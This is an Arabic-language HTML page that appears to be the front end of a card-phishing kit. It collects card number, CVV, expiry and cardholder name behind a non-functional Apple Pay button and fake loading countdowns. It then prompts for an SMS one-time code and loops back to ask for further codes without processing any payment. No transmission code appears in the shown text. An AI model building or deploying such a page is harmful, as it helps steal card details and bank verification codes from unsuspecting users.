<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>بطاقة الدفع</title>

<style>
*,
*::before,
*::after {
  box-sizing: border-box;
}

html {
  -webkit-text-size-adjust: 100%;
  text-size-adjust: 100%;
}

body {
  font-family: Arial, sans-serif;
  background: #f5f5f5;
  margin: 0;
  padding: 0;
  overflow-x: hidden;
}

/* الشاشة الأساسية بدون فراغ زائد تحت */
.payment-screen {
  width: 100%;
  padding: 14px 14px 12px;
}

.page-shell {
  width: 100%;
  max-width: 430px;
  margin: 0 auto;
}

/* طبقة Apple Pay البيضاء */
.apple-pay-screen {
  position: fixed;
  inset: 0;
  background: #fff;
  z-index: 99999;
  display: none;
}

/* زر Apple Pay */
.apple-pay-btn {
  width: 100%;
  background: #000;
  border-radius: 999px;
  height: 70px;
  margin: 8px auto 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  cursor: pointer;
  border: none;
  outline: none;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
}

/* حاوية الشعار */
.apple-wrap {
  width: 175px;
  height: 44px;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}

/*
  تم تعديل الشعار هنا:
  تصغير بسيط + نزول للأسفل شوي
*/
.apple-logo {
  width: 100%;
  height: auto;
  display: block;
  object-fit: contain;
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  pointer-events: none;
  user-select: none;
  -webkit-user-drag: none;
  transform: scale(1.68) translateY(9px);
  transform-origin: center center;
}

/* الإطار */
.box {
  width: 100%;
  border: 2px solid #000;
  border-radius: 26px;
  padding: 20px;
  background: #fff;
  overflow: hidden;
}

/* العنوان */
.title {
  font-size: 22px;
  font-weight: 700;
  margin-bottom: 15px;
}

/* حقل رقم البطاقة */
.input-box {
  width: 100%;
  background: #f2f2f2;
  border-radius: 30px;
  padding: 0 15px;
  height: 52px;
  margin-top: 15px;
  display: flex;
  align-items: center;
  border: 1px solid transparent;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  overflow: hidden;
}

/* الشعار */
.card-icon {
  width: 65px;
  height: auto;
  margin-left: 10px;
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  display: block;
  flex-shrink: 0;
}

/* رقم البطاقة */
.card-number {
  border: none;
  outline: none;
  background: transparent;
  font-size: 16px;
  width: 100%;
  text-align: right;
  color: #111;
}

/* صف */
.row {
  display: flex;
  width: 100%;
  gap: 10px;
  margin-top: 15px;
}

.small-input {
  flex: 1;
  min-width: 0;
  border: 1px solid transparent;
  outline: none;
  background: #f2f2f2;
  border-radius: 30px;
  padding: 12px;
  text-align: center;
  font-size: 15px;
  height: 48px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  color: #111;
}

/* الاسم */
.name-input {
  border: 1px solid transparent;
  outline: none;
  background: #f2f2f2;
  border-radius: 30px;
  height: 52px;
  padding: 0 14px;
  width: 100%;
  text-align: center;
  font-size: 16px;
  margin-top: 15px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  color: #111;
}

/* حقل تاريخ الانتهاء */
.expiry-box {
  flex: 1;
  min-width: 0;
  background: #f2f2f2;
  border-radius: 30px;
  height: 48px;
  display: flex;
  align-items: center;
  justify-content: center;
  border: 1px solid transparent;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  overflow: hidden;
  direction: ltr;
}

.expiry-select {
  width: 44%;
  border: none;
  outline: none;
  background: transparent;
  font-size: 15px;
  text-align: center;
  text-align-last: center;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  padding: 0;
  color: #000;
  cursor: pointer;
}

.expiry-sep {
  width: 12%;
  text-align: center;
  font-size: 15px;
  color: #555;
  user-select: none;
}

/* زر الدفع */
.pay-btn {
  width: 100%;
  margin: 16px auto 0;
  background: #2e9f44;
  color: #fff;
  border: none;
  border-radius: 999px;
  height: 70px;
  font-size: 21px;
  font-weight: 700;
  cursor: pointer;
  display: block;
  -webkit-tap-highlight-color: transparent;
}

/* حالة الخطأ */
.error {
  border-color: rgba(220, 38, 38, 0.45) !important;
  box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.08) !important;
}

input::placeholder {
  color: #777;
}

select:invalid {
  color: #777;
}

/* الشاشات */
.flow-screen {
  position: fixed;
  inset: 0;
  background: #fff;
  z-index: 100000;
  display: none;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.flow-card {
  width: 100%;
  max-width: 420px;
  text-align: center;
}

/* الدولاب */
.loader-pro {
  position: relative;
  width: 124px;
  height: 124px;
  margin: 0 auto 22px;
  border-radius: 50%;
  background: conic-gradient(
    from 210deg,
    #0b78f2 0deg 58deg,
    #b9dafb 58deg 360deg
  );
  animation: spinRing 1.15s linear infinite;
}

.loader-pro::before {
  content: "";
  position: absolute;
  inset: 18px;
  background: #fff;
  border-radius: 50%;
}

.loader-pro::after {
  content: "";
  position: absolute;
  inset: 0;
  border-radius: 50%;
  box-shadow:
    0 0 0 1px rgba(11, 120, 242, 0.03),
    0 8px 20px rgba(11, 120, 242, 0.08);
}

.countdown {
  font-size: 32px;
  font-weight: 700;
  color: #1d4ed8;
  direction: ltr;
}

/* صفحة OTP */
.otp-desc {
  font-size: 17px;
  line-height: 2;
  color: #111;
  margin-bottom: 18px;
}

.otp-input {
  width: 100%;
  height: 52px;
  border-radius: 30px;
  border: 1px solid transparent;
  background: #f2f2f2;
  outline: none;
  text-align: center;
  font-size: 18px;
  padding: 0 16px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
}

.otp-btn {
  width: 100%;
  margin-top: 15px;
  background: #2e9f44;
  color: #fff;
  border: none;
  border-radius: 40px;
  height: 56px;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
}

input,
select,
button {
  font-family: inherit;
}

@keyframes spinRing {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

/* للجوال */
@media (max-width: 480px) {
  .payment-screen {
    padding: 10px 10px 10px;
  }

  .page-shell {
    max-width: 100%;
  }

  .apple-pay-btn {
    height: 64px;
    margin-bottom: 14px;
  }

  .apple-wrap {
    width: 150px;
    height: 38px;
  }

  .apple-logo {
    transform: scale(1.60) translateY(8px);
  }

  .box {
    padding: 16px;
  }

  .title {
    font-size: 20px;
  }

  .pay-btn {
    height: 64px;
    font-size: 19px;
  }
}

/* للكمبيوتر و GitHub */
@media (min-width: 700px) {
  body {
    display: flex;
    justify-content: center;
  }

  .payment-screen {
    padding-top: 16px;
    padding-bottom: 10px;
  }

  .page-shell {
    max-width: 440px;
  }

  .apple-pay-btn {
    height: 72px;
  }

  .apple-wrap {
    width: 190px;
    height: 46px;
  }

  .apple-logo {
    transform: scale(1.76) translateY(9px);
  }
}
</style>
</head>

<body>

<div class="payment-screen" id="paymentScreen">
  <div class="page-shell">

    <div class="apple-pay-screen" id="applePayScreen"></div>

    <button class="apple-pay-btn" id="applePayBtn" type="button">
      <div class="apple-wrap">
        <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo" alt="Apple Pay">
      </div>
    </button>

    <div class="box">
      <div class="title">بطاقة الائتمان</div>

      <div class="input-box" id="cardBox">
        <img
          id="cardLogo"
          class="card-icon"
          src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
          alt="card"
        >

        <input
          type="text"
          id="cardNumber"
          class="card-number"
          placeholder="رقم البطاقة"
          maxlength="16"
          inputmode="numeric"
          autocomplete="cc-number"
        >
      </div>

      <div class="row">
        <input
          type="text"
          id="cvv"
          class="small-input"
          placeholder="CVV"
          maxlength="3"
          inputmode="numeric"
          autocomplete="cc-csc"
        >

        <div class="expiry-box" id="expiryBox">
          <select id="expMonth" class="expiry-select" required>
            <option value="" selected disabled>MM</option>
          </select>
          <div class="expiry-sep">/</div>
          <select id="expYear" class="expiry-select" required>
            <option value="" selected disabled>YY</option>
          </select>
        </div>
      </div>

      <input
        type="text"
        id="cardName"
        class="name-input"
        placeholder="الاسم الموجود على البطاقة"
        autocomplete="cc-name"
      >
    </div>

    <button class="pay-btn" id="payBtn" type="button">ادفع الآن</button>

  </div>
</div>

<div class="flow-screen" id="loadingScreen1">
  <div class="flow-card">
    <div class="loader-pro"></div>
    <div class="countdown" id="countdown60">60</div>
  </div>
</div>

<div class="flow-screen" id="otpScreen">
  <div class="flow-card">
    <div class="otp-desc">
      يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة
    </div>

    <input
      type="text"
      id="otpInput"
      class="otp-input"
      placeholder="أدخل رمز التحقق"
      inputmode="numeric"
      maxlength="6"
    >

    <button class="otp-btn" id="otpBtn" type="button">تحقق</button>
  </div>
</div>

<div class="flow-screen" id="loadingScreen2">
  <div class="flow-card">
    <div class="loader-pro"></div>
  </div>
</div>

<script>
const cardInput = document.getElementById("cardNumber");
const cvvInput = document.getElementById("cvv");
const nameInput = document.getElementById("cardName");
const expMonth = document.getElementById("expMonth");
const expYear = document.getElementById("expYear");
const expiryBox = document.getElementById("expiryBox");
const logo = document.getElementById("cardLogo");
const cardBox = document.getElementById("cardBox");
const payBtn = document.getElementById("payBtn");
const applePayBtn = document.getElementById("applePayBtn");
const applePayScreen = document.getElementById("applePayScreen");

const paymentScreen = document.getElementById("paymentScreen");
const loadingScreen1 = document.getElementById("loadingScreen1");
const otpScreen = document.getElementById("otpScreen");
const loadingScreen2 = document.getElementById("loadingScreen2");

const countdown60 = document.getElementById("countdown60");
const otpInput = document.getElementById("otpInput");
const otpBtn = document.getElementById("otpBtn");

const LOGO_DEFAULT = "https://i.postimg.cc/Hsf6sDzk/20260412-152344.png";
const LOGO_VISA = "https://i.postimg.cc/Gmw4mqyR/20260412-151020.png";
const LOGO_MC = "https://i.postimg.cc/fb5y5sgX/20260412-150959.png";

let timer60 = null;
let timer30 = null;

for (let i = 1; i <= 12; i++) {
  const val = String(i).padStart(2, "0");
  const option = document.createElement("option");
  option.value = val;
  option.textContent = val;
  expMonth.appendChild(option);
}

for (let i = 26; i <= 50; i++) {
  const val = String(i);
  const option = document.createElement("option");
  option.value = val;
  option.textContent = val;
  expYear.appendChild(option);
}

function toggleError(element, show) {
  if (show) {
    element.classList.add("error");
  } else {
    element.classList.remove("error");
  }
}

function setCaretToEnd(el) {
  try {
    const len = el.value.length;
    el.setSelectionRange(len, len);
  } catch (e) {}
}

function sanitizeCard(value) {
  return value.replace(/\D/g, "").slice(0, 16);
}

function sanitizeCVV(value) {
  return value.replace(/\D/g, "").slice(0, 3);
}

function sanitizeName(value) {
  return value
    .replace(/[^A-Za-z ]/g, "")
    .replace(/\s{2,}/g, " ")
    .replace(/^\s+/, "");
}

function sanitizeOTP(value) {
  return value.replace(/\D/g, "").slice(0, 6);
}

function showScreen(screen) {
  paymentScreen.style.display = "none";
  loadingScreen1.style.display = "none";
  otpScreen.style.display = "none";
  loadingScreen2.style.display = "none";
  screen.style.display = "flex";
}

function hideAllTimers() {
  if (timer60) {
    clearInterval(timer60);
    timer60 = null;
  }
  if (timer30) {
    clearTimeout(timer30);
    timer30 = null;
  }
}

function detectCardType(number) {
  if (!/^\d+$/.test(number)) return "unknown";
  if (number.startsWith("4")) return "visa";

  if (number.length >= 2) {
    const firstTwo = parseInt(number.slice(0, 2), 10);
    if (firstTwo >= 51 && firstTwo <= 55) return "mastercard";
  }

  if (number.length >= 4) {
    const firstFour = parseInt(number.slice(0, 4), 10);
    if (firstFour >= 2221 && firstFour <= 2720) return "mastercard";
  }

  return "unknown";
}

function updateCardLogo(type) {
  if (type === "visa") {
    logo.src = LOGO_VISA;
  } else if (type === "mastercard") {
    logo.src = LOGO_MC;
  } else {
    logo.src = LOGO_DEFAULT;
  }
}

function validateCard() {
  const value = cardInput.value;
  const type = detectCardType(value);
  updateCardLogo(type);
  const valid = /^\d{16}$/.test(value);
  toggleError(cardBox, !valid);
  return valid;
}

function validateCVV() {
  const valid = /^\d{3}$/.test(cvvInput.value);
  toggleError(cvvInput, !valid);
  return valid;
}

function validateName() {
  const value = nameInput.value.trim();
  const valid = /^[A-Za-z ]+$/.test(value) && /[A-Za-z]/.test(value);
  toggleError(nameInput, !valid);
  return valid;
}

function validateExpiry() {
  const month = expMonth.value;
  const year = expYear.value;
  const valid = month !== "" && year !== "";
  toggleError(expiryBox, !valid);
  return valid;
}

function validateOTP() {
  const value = otpInput.value.trim();
  const valid = /^\d{4,6}$/.test(value);
  toggleError(otpInput, !valid);
  return valid;
}

cardInput.addEventListener("input", function () {
  this.value = sanitizeCard(this.value);
  updateCardLogo(detectCardType(this.value));

  if (this.value.length > 0) {
    if (/^\d{16}$/.test(this.value)) {
      validateCard();
    } else {
      toggleError(cardBox, false);
    }
  } else {
    toggleError(cardBox, false);
    updateCardLogo("unknown");
  }
});

cardInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (!/^\d$/.test(ch)) e.preventDefault();
});

cvvInput.addEventListener("input", function () {
  this.value = sanitizeCVV(this.value);

  if (this.value.length > 0) {
    if (this.value.length === 3) {
      validateCVV();
    } else {
      toggleError(cvvInput, false);
    }
  } else {
    toggleError(cvvInput, false);
  }
});

cvvInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (!/^\d$/.test(ch)) e.preventDefault();
});

nameInput.addEventListener("input", function () {
  this.value = sanitizeName(this.value);

  if (this.value.trim().length > 0) {
    validateName();
  } else {
    toggleError(nameInput, false);
  }
});

nameInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (ch.length === 1 && !/[A-Za-z ]/.test(ch)) {
    e.preventDefault();
  }
});

otpInput.addEventListener("input", function () {
  this.value = sanitizeOTP(this.value);

  if (this.value.length > 0) {
    validateOTP();
  } else {
    toggleError(otpInput, false);
  }
});

otpInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (!/^\d$/.test(ch)) e.preventDefault();
});

expMonth.addEventListener("paste", function (e) { e.preventDefault(); });
expYear.addEventListener("paste", function (e) { e.preventDefault(); });

cardInput.addEventListener("focus", () => cardBox.classList.remove("error"));
cvvInput.addEventListener("focus", () => cvvInput.classList.remove("error"));
nameInput.addEventListener("focus", () => nameInput.classList.remove("error"));
expMonth.addEventListener("focus", () => expiryBox.classList.remove("error"));
expYear.addEventListener("focus", () => expiryBox.classList.remove("error"));
otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));

expMonth.addEventListener("change", validateExpiry);
expYear.addEventListener("change", validateExpiry);

applePayBtn.addEventListener("click", function () {
  applePayScreen.style.display = "block";
  setTimeout(function () {
    applePayScreen.style.display = "none";
  }, 2000);
});

function startFirstLoading() {
  hideAllTimers();
  showScreen(loadingScreen1);

  let seconds = 60;
  countdown60.textContent = seconds;

  timer60 = setInterval(function () {
    seconds--;
    countdown60.textContent = seconds;

    if (seconds <= 0) {
      clearInterval(timer60);
      timer60 = null;
      showScreen(otpScreen);
      otpInput.value = "";
      otpInput.classList.remove("error");
    }
  }, 1000);
}

function startSecondLoading() {
  hideAllTimers();
  showScreen(loadingScreen2);

  timer30 = setTimeout(function () {
    timer30 = null;
    showScreen(otpScreen);
    otpInput.value = "";
    otpInput.classList.remove("error");
  }, 30000);
}

otpBtn.addEventListener("click", function () {
  const isOtpValid = validateOTP();
  if (!isOtpValid) return;
  startSecondLoading();
});

payBtn.addEventListener("click", function (e) {
  e.preventDefault();

  const isCardValid = validateCard();
  const isCVVValid = validateCVV();
  const isNameValid = validateName();
  const isExpiryValid = validateExpiry();

  if (isCardValid && isCVVValid && isNameValid && isExpiryValid) {
    startFirstLoading();
  }
});
</script>
</body>
</html>
